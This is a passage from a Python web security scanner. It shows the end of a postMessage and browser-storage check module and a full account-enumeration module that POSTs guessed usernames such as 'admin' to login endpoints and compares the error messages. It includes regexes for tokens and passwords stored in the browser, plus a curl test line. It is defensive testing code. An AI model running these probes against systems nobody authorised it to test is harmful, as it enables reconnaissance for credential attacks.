                            "potentially manipulating DOM, stealing data, or executing actions."),
                        "recommendation": (
                            "Always validate event.origin in message listeners.\n"
                            "Fix example:\n"
                            "  window.addEventListener('message', function(event) {\n"
                            "    if (event.origin !== 'https://trusted-domain.com') return;\n"
                            "    // process event.data\n"
                            "  });"),
                    })
                elif "postMessage" in js_code and not has_origin_check:
                    add("postmessage", {
                        "confirmed": False,
                        "severity": "Medium",
                        "title": "Potential Insecure postMessage — No Origin Validation",
                        "url": js_url,
                        "description": (
                            "postMessage detected but message listener lacks explicit "
                            "event.origin validation. Manual review recommended."),
                        "recommendation": "Validate event.origin before processing postMessage data.",
                    })

            # 2. Sensitive data in localStorage
            SENSITIVE_PATTERNS = [
                (r"""localStorage\.setItem\s*\(\s*["'][^"']*(?:token|password|secret|key|auth|session|credential|passwd)[^"']*["']""",
                 "JWT/Auth token stored in localStorage"),
                (r"""localStorage\.setItem\s*\(\s*["'][^"']*(?:credit|card|ssn|password|passwd)[^"']*["']""",
                 "Sensitive PII stored in localStorage"),
                (r"""sessionStorage\.setItem\s*\(\s*["'][^"']*(?:password|secret|key|token)[^"']*["']""",
                 "Secret stored in sessionStorage"),
            ]

            for pattern, label in SENSITIVE_PATTERNS:
                if re.search(pattern, js_code, re.I):
                    add("postmessage", {
                        "confirmed": True,
                        "severity": "High",
                        "title": f"Sensitive Data in Browser Storage — {label}",
                        "url": js_url,
                        "description": (
                            f"CONFIRMED: {label} detected in JavaScript. "
                            "Browser storage (localStorage/sessionStorage) is accessible "
                            "to any JavaScript on the page — an XSS vulnerability would "
                            "allow an attacker to steal these values."),
                        "recommendation": (
                            "Never store tokens, passwords, or sensitive data in localStorage/sessionStorage.\n"
                            "Use HttpOnly, Secure cookies for session tokens instead.\n"
                            "If localStorage is required, encrypt the data first with a server-derived key.\n"
                            "Fix: Replace localStorage.setItem('token', val) with HttpOnly cookie: "
                            "Set-Cookie: token=val; HttpOnly; Secure; SameSite=Strict"),
                    })

            # 3. Cross-origin iframe without sandbox
            if "iframe" in html.lower():
                iframes = re.findall(r'<iframe[^>]+>', html, re.I)
                for iframe in iframes:
                    has_sandbox = "sandbox" in iframe.lower()
                    has_allow_scripts = "allow-scripts" in iframe.lower()
                    src_m = re.search(r'src=["\']([^"\']+)["\']', iframe, re.I)
                    if src_m and not has_sandbox:
                        iframe_src = src_m.group(1)
                        if iframe_src.startswith("http") and parsed.netloc not in iframe_src:
                            add("postmessage", {
                                "confirmed": True,
                                "severity": "Medium",
                                "title": f"Cross-Origin iframe Without sandbox Attribute",
                                "url": url,
                                "description": (
                                    f"CONFIRMED: Cross-origin iframe loading '{iframe_src[:60]}' "
                                    "without sandbox attribute. If the framed content is compromised, "
                                    "it may interact with the parent page via postMessage without restriction."),
                                "recommendation": (
                                    "Add sandbox attribute to cross-origin iframes.\n"
                                    "Fix: <iframe src='...' sandbox='allow-scripts allow-same-origin'></iframe>"),
                            })

    except Exception as e:
        warn(f"PostMessage scan error: {e}")

    _module_done("postmessage")


# ═══════════════════════════════════════════════════════════════════
#  MODULE 78 — Account Enumeration (WSTG-IDNT-04)
# ═══════════════════════════════════════════════════════════════════
def account_enum_scan(url):
    if _module_skip("acct_enum"): info("Skipping Account Enumeration (already done)"); return
    section("MODULE 78 — ACCOUNT ENUMERATION","👤")

    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    ENUM_PATHS = {
        "login":    ["/login", "/signin", "/api/login", "/api/auth"],
        "register": ["/register", "/signup", "/api/register", "/api/signup",
                     "/account/register", "/users/new"],
        "forgot":   ["/forgot-password", "/forgot", "/reset-password",
                     "/api/forgot-password", "/api/reset", "/password/reset"],
    }

    # Test usernames: one that likely exists, one that certainly doesn't
    TEST_USERS = {
        "valid_guess":   ["admin", "administrator", "user", "test", "info", "support"],
        "invalid_guess": ["ZZZINVALIDUSERXYZ999", "nosuchuser12345xyz"],
    }

    found = False

    for ep_type, paths in ENUM_PATHS.items():
        for path in paths:
            ep = base + path
            try:
                r0 = rget(ep, timeout=5)
                if r0.status_code == 404: continue
                html = r0.text.lower()
                if "password" not in html and "email" not in html and "user" not in html:
                    continue
            except Exception:
                continue

            good(f"Testing enumeration at: {ep}")

            # Collect responses for valid vs invalid users
            responses_valid   = []
            responses_invalid = []

            field_pairs = [("email","password"),("username","password"),("email","pass")]

            for user_field, pass_field in field_pairs[:2]:
                for valid_user in TEST_USERS["valid_guess"][:3]:
                    try:
                        r = rpost(ep,
                            data={user_field: valid_user, pass_field: "WRONGPASS_ZZZ"},
                            timeout=8, allow_redirects=True, verify=False)
                        responses_valid.append({
                            "user": valid_user,
                            "status": r.status_code,
                            "body": r.text[:500],
                            "size": len(r.content),
                        })
                    except Exception:
                        pass
                    time.sleep(0.3)

                for invalid_user in TEST_USERS["invalid_guess"]:
                    try:
                        r = rpost(ep,
                            data={user_field: invalid_user, pass_field: "WRONGPASS_ZZZ"},
                            timeout=8, allow_redirects=True, verify=False)
                        responses_invalid.append({
                            "user": invalid_user,
                            "status": r.status_code,
                            "body": r.text[:500],
                            "size": len(r.content),
                        })
                    except Exception:
                        pass
                    time.sleep(0.3)

            if not responses_valid or not responses_invalid:
                continue

            # Compare error messages
            valid_msgs   = [r["body"].lower() for r in responses_valid]
            invalid_msgs = [r["body"].lower() for r in responses_invalid]

            # Check for different error text
            VALID_INDICATORS   = ["wrong password", "incorrect password", "password is incorrect",
                                   "invalid password", "account found", "password doesn't match"]
            INVALID_INDICATORS = ["user not found", "account not found", "no account",
                                   "email not registered", "username not found",
                                   "doesn't exist", "not registered"]

            valid_has_valid_indicator   = any(any(ind in m for ind in VALID_INDICATORS)   for m in valid_msgs)
            invalid_has_invalid_indicator = any(any(ind in m for ind in INVALID_INDICATORS) for m in invalid_msgs)

            if valid_has_valid_indicator or invalid_has_invalid_indicator:
                # Different error messages detected
                v_sample = responses_valid[0]["body"][:150].strip() if responses_valid else ""
                i_sample = responses_invalid[0]["body"][:150].strip() if responses_invalid else ""
                add("acct_enum", {
                    "confirmed": True,
                    "severity": "Medium",
                    "title": f"Account Enumeration via {ep_type.title()} Error Message at {path}",
                    "url": ep,
                    "description": (
                        f"CONFIRMED: Different error messages for valid vs invalid usernames at {path}. "
                        f"Valid user response: '{v_sample}' "
                        f"Invalid user response: '{i_sample}' "
                        "An attacker can identify valid usernames before launching targeted brute-force."),
                    "recommendation": (
                        "Return identical error messages for both valid and invalid usernames.\n"
                        "Fix example:\n"
                        "  // Always return the same message:\n"
                        "  return res.status(401).json({error: 'Invalid credentials'});\n"
                        "  // Never return: 'User not found' or 'Wrong password' separately.\n"
                        "Also implement account lockout and CAPTCHA after 5 failures.\n"
                        f"Test with: curl -X POST {ep} -d 'username=admin&password=wrong'"),
                })
                vuln(f"Account enumeration at {path} ({ep_type})", "Medium")
                found = True
                continue

            # Check for response size difference
            if responses_valid and responses_invalid:
                avg_valid   = sum(r["size"] for r in responses_valid) / len(responses_valid)
                avg_invalid = sum(r["size"] for r in responses_invalid) / len(responses_invalid)
                if abs(avg_valid - avg_invalid) > 100:
                    add("acct_enum", {
                        "confirmed": True,
                        "severity": "Medium",
                        "title": f"Account Enumeration via Response Size at {path}",
                        "url": ep,
                        "description": (
                            f"CONFIRMED: Response size differs for valid ({avg_valid:.0f}B) "
                            f"vs invalid ({avg_invalid:.0f}B) usernames at {path}. "
                            "Even without different text, size difference reveals valid usernames."),
                        "recommendation": (
                            "Pad responses to equal size or use identical templates "
                            "for both valid and invalid user error responses."),
                    })
                    found = True

    if not found:
        good("No account enumeration vulnerability detected")
    _module_done("acct_enum")


if __name__ == "__main__":
    main()
